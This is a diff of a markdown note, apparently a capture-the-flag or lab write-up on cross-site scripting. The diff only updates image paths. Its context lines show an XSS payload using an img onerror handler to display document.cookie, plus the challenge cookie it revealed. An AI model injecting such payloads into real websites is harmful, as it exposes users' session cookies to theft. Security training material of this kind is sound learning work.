@@ -28,12 +28,12 @@ An attacker can leverage this to steal cookie sessions and send them to themselv
 
 # Question
 
-![](../images/Pasted%20image%2020250122182255.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250122182255.png)
 
 We can submit the following payload:
 
 `<img src=/ onerror=alert(document.cookie)>`
 
-![](../images/Pasted%20image%2020250122182531.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250122182531.png)
 
 We got the cookie: `XSSisFun`
